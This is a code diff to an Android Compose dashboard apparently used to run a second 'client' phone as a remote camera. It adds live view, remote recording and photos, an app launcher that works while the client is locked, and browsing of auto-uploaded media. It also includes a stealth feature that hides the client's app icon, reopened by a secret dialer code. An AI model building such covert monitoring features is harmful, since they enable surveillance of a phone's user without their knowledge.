@@ -5,6 +5,7 @@ import android.content.ClipboardManager
 import android.content.Context
 import android.widget.Toast
 import androidx.compose.animation.AnimatedVisibility
+import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
@@ -24,11 +25,14 @@ import androidx.compose.foundation.lazy.items
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.Apps
 import androidx.compose.material.icons.filled.CameraAlt
 import androidx.compose.material.icons.filled.Cameraswitch
 import androidx.compose.material.icons.filled.CheckCircle
+import androidx.compose.material.icons.filled.Cloud
 import androidx.compose.material.icons.filled.ContentCopy
 import androidx.compose.material.icons.filled.DeleteSweep
+import androidx.compose.material.icons.filled.Download
 import androidx.compose.material.icons.filled.FlashOn
 import androidx.compose.material.icons.filled.Info
 import androidx.compose.material.icons.filled.Link
@@ -38,10 +42,19 @@ import androidx.compose.material.icons.filled.QrCode
 import androidx.compose.material.icons.filled.Security
 import androidx.compose.material.icons.filled.Sensors
 import androidx.compose.material.icons.filled.Shield
+import androidx.compose.material.icons.filled.PhotoCamera
+import androidx.compose.material.icons.filled.PhotoLibrary
+import androidx.compose.material.icons.filled.PlayArrow
+import androidx.compose.material.icons.filled.RadioButtonChecked
+import androidx.compose.material.icons.filled.Refresh
+import androidx.compose.material.icons.filled.Stop
 import androidx.compose.material.icons.filled.SignalCellularAlt
 import androidx.compose.material.icons.filled.Speed
 import androidx.compose.material.icons.filled.Vibration
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
 import androidx.compose.material.icons.filled.Videocam
+import androidx.compose.material.icons.filled.VideoFile
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
@@ -59,10 +72,15 @@ import androidx.compose.material3.SwitchDefaults
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.runtime.Composable
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.text.font.FontFamily
@@ -136,6 +154,13 @@ fun SecurityDashboardScreen(
                     )
                 }
             }
+        }
+
+        // Live view from the client camera. On the control phone we decode the
+        // latest base64 JPEG the client streamed over Firebase and show it here
+        // so the user can actually see the monitored device.
+        item {
+            LiveSnapshotCard(uiState = uiState)
         }
 
         // System State & Active Monitoring Controls Row
@@ -448,6 +473,69 @@ fun SecurityDashboardScreen(
                         }
                     }
 
+                    // Additional remote controls for full control over the client
+                    // camera device: arm/disarm, recording and snapshot.
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.spacedBy(8.dp)
+                    ) {
+                        OutlinedButton(
+                            onClick = { viewModel.remoteToggleArm() },
+                            modifier = Modifier
+                                .weight(1f)
+                                .testTag("remote_toggle_arm_button"),
+                            colors = ButtonDefaults.outlinedButtonColors(
+                                contentColor = if (uiState.isSystemArmed) ActiveGreen else TextPrimary
+                            ),
+                            border = androidx.compose.foundation.BorderStroke(
+                                1.dp,
+                                if (uiState.isSystemArmed) ActiveGreen else SlateBorder
+                            )
+                        ) {
+                            Icon(Icons.Default.Shield, contentDescription = null, modifier = Modifier.size(16.dp))
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Text(if (uiState.isSystemArmed) "Armed" else "Disarm", fontSize = 12.sp)
+                        }
+
+                        OutlinedButton(
+                            onClick = {
+                                if (uiState.isRecording) viewModel.remoteStopRecording()
+                                else viewModel.remoteStartRecording()
+                            },
+                            modifier = Modifier
+                                .weight(1f)
+                                .testTag("remote_record_button"),
+                            colors = ButtonDefaults.outlinedButtonColors(
+                                contentColor = if (uiState.isRecording) LiveRed else TextPrimary
+                            ),
+                            border = androidx.compose.foundation.BorderStroke(
+                                1.dp,
+                                if (uiState.isRecording) LiveRed else SlateBorder
+                            )
+                        ) {
+                            Icon(
+                                imageVector = if (uiState.isRecording) Icons.Default.Stop else Icons.Default.RadioButtonChecked,
+                                contentDescription = null,
+                                modifier = Modifier.size(16.dp)
+                            )
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Text(if (uiState.isRecording) "Stop Rec" else "Rec", fontSize = 12.sp)
+                        }
+
+                        OutlinedButton(
+                            onClick = { viewModel.remoteCapturePhoto() },
+                            modifier = Modifier
+                                .weight(1f)
+                                .testTag("remote_capture_button"),
+                            colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                            border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                        ) {
+                            Icon(Icons.Default.PhotoCamera, contentDescription = null, modifier = Modifier.size(16.dp))
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Text("Snap", fontSize = 12.sp)
+                        }
+                    }
+
                     uiState.lastRemoteCommandText?.let { cmd ->
                         Spacer(modifier = Modifier.height(8.dp))
                         Text(
@@ -456,6 +544,101 @@ fun SecurityDashboardScreen(
                             color = ActiveGreen,
                             fontSize = 10.sp
                         )
+                    }
+                }
+            }
+        }
+
+        // Remote camera control + app stealth. Only shown on the control flavor.
+        // NOTE: Remote lock / wipe / disable-camera / true kiosk require Device
+        // Owner provisioning, which itself needs a factory reset or USB — not
+        // possible under this project's constraints — so those commands are not
+        // offered here. Live-view connect and app-icon hiding work without
+        // Device Owner.
+        if (uiState.isControlDevice) {
+            item {
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(containerColor = SlateCard),
+                    shape = RoundedCornerShape(16.dp)
+                ) {
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Icon(
+                                imageVector = Icons.Default.Videocam,
+                                contentDescription = null,
+                                tint = ActiveGreen,
+                                modifier = Modifier.size(18.dp)
+                            )
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text(
+                                text = "Live View & Stealth",
+                                style = MaterialTheme.typography.titleMedium,
+                                color = TextPrimary
+                            )
+                        }
+                        Spacer(modifier = Modifier.height(4.dp))
+                        Text(
+                            text = "Camera stays OFF on the client until you connect, saving its battery. Hide the app icon on the client to keep it discreet — relaunch by dialling *#*#2426483#*#*.",
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextSecondary,
+                            fontSize = 10.sp
+                        )
+                        Spacer(modifier = Modifier.height(12.dp))
+
+                        // Connect / Disconnect live view — wakes or sleeps the
+                        // client camera.
+                        Row(
+                            horizontalArrangement = Arrangement.spacedBy(8.dp),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            OutlinedButton(
+                                onClick = { viewModel.remoteStartLiveView() },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = ActiveGreen),
+                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                            ) {
+                                Icon(Icons.Default.PlayArrow, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("Connect Camera", fontSize = 12.sp)
+                            }
+                            OutlinedButton(
+                                onClick = { viewModel.remoteStopLiveView() },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary),
+                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                            ) {
+                                Icon(Icons.Default.Stop, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("Disconnect", fontSize = 12.sp)
+                            }
+                        }
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Row(
+                            horizontalArrangement = Arrangement.spacedBy(8.dp),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            OutlinedButton(
+                                onClick = { viewModel.remoteHideAppIcon() },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                            ) {
+                                Icon(Icons.Default.VisibilityOff, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("Hide Icon", fontSize = 12.sp)
+                            }
+                            OutlinedButton(
+                                onClick = { viewModel.remoteShowAppIcon() },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                            ) {
+                                Icon(Icons.Default.Visibility, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("Show Icon", fontSize = 12.sp)
+                            }
+                        }
                     }
                 }
             }
@@ -713,6 +896,178 @@ fun SecurityDashboardScreen(
                 MotionEventRow(event = event)
             }
         }
+
+        // Remote App Launcher (control flavor). Type a package name and open it
+        // on the client — works even with the client screen locked because the
+        // launch is routed through the client's foreground service.
+        if (uiState.isControlDevice) {
+            item {
+                var pkgInput by remember { mutableStateOf("") }
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(containerColor = SlateCard),
+                    shape = RoundedCornerShape(16.dp)
+                ) {
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Icon(
+                                imageVector = Icons.Default.Apps,
+                                contentDescription = null,
+                                tint = ActiveGreen,
+                                modifier = Modifier.size(18.dp)
+                            )
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text(
+                                text = "Open App on Client",
+                                style = MaterialTheme.typography.titleMedium,
+                                color = TextPrimary
+                            )
+                        }
+                        Spacer(modifier = Modifier.height(4.dp))
+                        Text(
+                            text = "Launch any installed app on the client phone by package name (e.g. com.whatsapp). Works while the client screen is locked.",
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextSecondary,
+                            fontSize = 10.sp
+                        )
+                        Spacer(modifier = Modifier.height(12.dp))
+                        androidx.compose.material3.OutlinedTextField(
+                            value = pkgInput,
+                            onValueChange = { pkgInput = it.trim() },
+                            label = { Text("Package name") },
+                            singleLine = true,
+                            modifier = Modifier.fillMaxWidth(),
+                            colors = androidx.compose.material3.OutlinedTextFieldDefaults.colors(
+                                focusedTextColor = TextPrimary,
+                                unfocusedTextColor = TextPrimary
+                            )
+                        )
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Button(
+                            onClick = {
+                                if (pkgInput.isNotBlank()) {
+                                    viewModel.remoteLaunchApp(pkgInput)
+                                }
+                            },
+                            enabled = pkgInput.isNotBlank(),
+                            colors = ButtonDefaults.buttonColors(containerColor = CyanAccent),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Icon(Icons.Default.PlayArrow, contentDescription = null, modifier = Modifier.size(16.dp), tint = SlateDark)
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Text("Launch on Client", color = SlateDark)
+                        }
+                    }
+                }
+            }
+        }
+
+        // Cloud Media (control flavor). Browse photos/videos the client
+        // auto-uploaded to Firebase Storage and download them here.
+        if (uiState.isControlDevice) {
+            item {
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(containerColor = SlateCard),
+                    shape = RoundedCornerShape(16.dp)
+                ) {
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Icon(
+                                imageVector = Icons.Default.Cloud,
+                                contentDescription = null,
+                                tint = ActiveGreen,
+                                modifier = Modifier.size(18.dp)
+                            )
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text(
+                                text = "Cloud Media from Client",
+                                style = MaterialTheme.typography.titleMedium,
+                                color = TextPrimary
+                            )
+                        }
+                        Spacer(modifier = Modifier.height(4.dp))
+                        Text(
+                            text = "Recordings and photos the client captured are uploaded to Firebase Storage automatically. Tap Refresh to pull the latest list.",
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextSecondary,
+                            fontSize = 10.sp
+                        )
+                        Spacer(modifier = Modifier.height(12.dp))
+                        Row(
+                            horizontalArrangement = Arrangement.spacedBy(8.dp),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            OutlinedButton(
+                                onClick = { viewModel.remoteFetchMediaList() },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                            ) {
+                                Icon(Icons.Default.Refresh, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("Refresh", fontSize = 12.sp)
+                            }
+                        }
+                        Spacer(modifier = Modifier.height(8.dp))
+                        if (uiState.remoteMediaList.isEmpty()) {
+                            Text(
+                                text = "No media uploaded yet. Trigger a recording or photo on the client, then tap Refresh.",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = TextMuted
+                            )
+                        } else {
+                            uiState.remoteMediaList.forEach { entry ->
+                                Row(
+                                    modifier = Modifier
+                                        .fillMaxWidth()
+                                        .padding(vertical = 6.dp),
+                                    verticalAlignment = Alignment.CenterVertically
+                                ) {
+                                    Icon(
+                                        imageVector = if (entry.fileType == "VIDEO")
+                                            Icons.Default.VideoFile else Icons.Default.PhotoLibrary,
+                                        contentDescription = null,
+                                        tint = TextSecondary,
+                                        modifier = Modifier.size(20.dp)
+                                    )
+                                    Spacer(modifier = Modifier.width(10.dp))
+                                    Column(modifier = Modifier.weight(1f)) {
+                                        Text(
+                                            text = entry.fileName,
+                                            style = MaterialTheme.typography.bodyMedium,
+                                            color = TextPrimary,
+                                            fontSize = 12.sp
+                                        )
+                                        Text(
+                                            text = "${entry.fileType} • ${(entry.sizeBytes / 1024)} KB",
+                                            style = MaterialTheme.typography.labelSmall,
+                                            color = TextMuted,
+                                            fontSize = 10.sp
+                                        )
+                                    }
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    val ctx = androidx.compose.ui.platform.LocalContext.current
+                                    OutlinedButton(
+                                        onClick = {
+                                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(entry.url))
+                                                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                                            ctx.startActivity(intent)
+                                        },
+                                        colors = ButtonDefaults.outlinedButtonColors(contentColor = ActiveGreen),
+                                        border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+                                    ) {
+                                        Icon(Icons.Default.Download, contentDescription = null, modifier = Modifier.size(16.dp))
+                                        Spacer(modifier = Modifier.width(6.dp))
+                                        Text("Open", fontSize = 12.sp)
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
     }
 
     // Security Dialog
@@ -824,6 +1179,91 @@ fun MotionEventRow(event: MotionEvent) {
                     fontSize = 10.sp,
                     modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                 )
+            }
+        }
+    }
+}
+
+/**
+ * Shows the latest live JPEG streamed from the client (camera) phone over
+ * Firebase. Decoded from base64 into a Bitmap and shown with aspect ratio
+ * preserved. Shows a "waiting for client" placeholder until the first frame.
+ */
+@Composable
+fun LiveSnapshotCard(uiState: SecurityUiState) {
+    val base64 = uiState.remoteSnapshotBase64
+    val bitmap = remember(base64) {
+        if (base64.isNullOrEmpty()) null
+        else try {
+            val bytes = android.util.Base64.decode(base64, android.util.Base64.NO_WRAP)
+            android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    Card(
+        modifier = Modifier.fillMaxWidth(),
+        colors = CardDefaults.cardColors(containerColor = SlateCard),
+        shape = RoundedCornerShape(16.dp),
+        border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
+    ) {
+        Column(modifier = Modifier.padding(16.dp)) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Icon(
+                    imageVector = Icons.Default.Videocam,
+                    contentDescription = null,
+                    tint = if (uiState.isClientOnline) ActiveGreen else TextMuted,
+                    modifier = Modifier.size(18.dp)
+                )
+                Spacer(modifier = Modifier.width(8.dp))
+                Text(
+                    text = "Live View",
+                    style = MaterialTheme.typography.titleMedium,
+                    color = TextPrimary
+                )
+                Spacer(modifier = Modifier.weight(1f))
+                Text(
+                    text = if (uiState.isClientOnline) "● LIVE" else "● OFFLINE",
+                    style = MaterialTheme.typography.labelSmall,
+                    color = if (uiState.isClientOnline) LiveRed else TextMuted,
+                    fontWeight = FontWeight.Bold
+                )
+            }
+            Spacer(modifier = Modifier.height(12.dp))
+            Box(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .height(220.dp)
+                    .clip(RoundedCornerShape(12.dp))
+                    .background(SlateDark),
+                contentAlignment = Alignment.Center
+            ) {
+                if (bitmap != null) {
+                    Image(
+                        bitmap = bitmap.asImageBitmap(),
+                        contentDescription = "Live camera snapshot",
+                        modifier = Modifier.fillMaxSize(),
+                        contentScale = androidx.compose.ui.layout.ContentScale.Crop
+                    )
+                } else {
+                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                        Icon(
+                            imageVector = Icons.Default.Videocam,
+                            contentDescription = null,
+                            tint = TextMuted,
+                            modifier = Modifier.size(40.dp)
+                        )
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Text(
+                            text = if (uiState.isClientOnline)
+                                "Waiting for first frame…"
+                            else "Client offline — connect to start",
+                            style = MaterialTheme.typography.bodySmall,
+                            color = TextMuted
+                        )
+                    }
+                }
             }
         }
     }
